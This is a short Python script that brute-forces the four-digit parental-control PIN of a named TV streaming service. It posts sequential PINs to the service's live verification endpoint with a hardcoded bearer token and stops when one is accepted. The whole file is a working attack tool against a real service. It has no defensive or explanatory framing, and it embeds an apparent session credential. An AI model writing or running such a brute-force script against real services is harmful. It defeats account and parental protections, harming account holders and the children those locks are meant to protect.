import requests

def try_pins(start_pin, end_pin):
    base_url = "https://tvapi.solocoo.tv/v1/pin/parental/verify"
    headers = {
        "Content-Type": "application/json",
        "Authorization": "Bearer eyJhbGciOiJIVzI1NiIsIvR5cCI6IkpXVCJ9.eyJ0di5zb2xvY29vLmF1dGgiOnsicyI6IncxOTlkNGI1MC0xMjA1LTExZWYtOTQxNS02YjYxMWQzMjExODkiLCJ1IjoiRFNiOFZaZTU1Y21KRnpSVGZONmpIZyIsIm0iOjQsImwiOiJza19TSyIsImQiOiJQQyIsImRtIjoiQ2hyb21lIiwib20iOiJPIiwiYyI6IjBYczhjWFc4ZW1sZm42NlJIY1NORE9pbVpLaU5uNU5Uc2o1MXRrOVl3djAiLCJzdCI6ImZ1bGwiLCJnIjoiZXlKa1pTSTZJbUp5WVc1a1RXRndjR2x1WnlJc0ltSnlJam9pYzJ4emF5SXNJbVJpSWpwbVlXeHpaU3dpY0hRaU9tWmhiSE5sTENKdmNDSTZJalF6SWl3aWRYQWlPaUp0TjJONkluMCIsImYiOjYsImIiOiJzbHNrIn0sIm5iZiI6MTcyNDI3NjIyMiwiZXhwIjoxNzI0Mjc4MTEyLCJpYXQiOjE3MjQyNzYyMtIsImE1ZXI6Im03Y3oifQ.hge6DKFM4b81KqXTkcSsZRN6_gINQCY40GPW4E6NT5U"
    }
    
    for pin in range(start_pin, end_pin):
        pin_str = str(pin).zfill(4)
        data = {"pin": pin_str}
        
        try:
            response = requests.post(base_url, headers = headers, json = data)
            response_json = response.json()

            if response_json.get("Message") == None:
                print(f"[?] Trying PIN: {pin_str}")
                print(f"\033[92m[+] Found correct PIN: {pin_str}\033[0m") 
                exit()

            elif "token invalid" in response_json.get("Message"):
                print("\033[31m[-] Invalid Access Token\033[0m")
                exit()
                
            else:
                print(f"[?] Trying PIN: {pin_str}, response: {response_json.get("Message")}")

        except Exception as e:
            print(f"\033[31m [-] Trying PIN: {pin_str}, got error: {e}\033[0m")

if __name__ == "__main__":
    try_pins(0000, 1001)

    
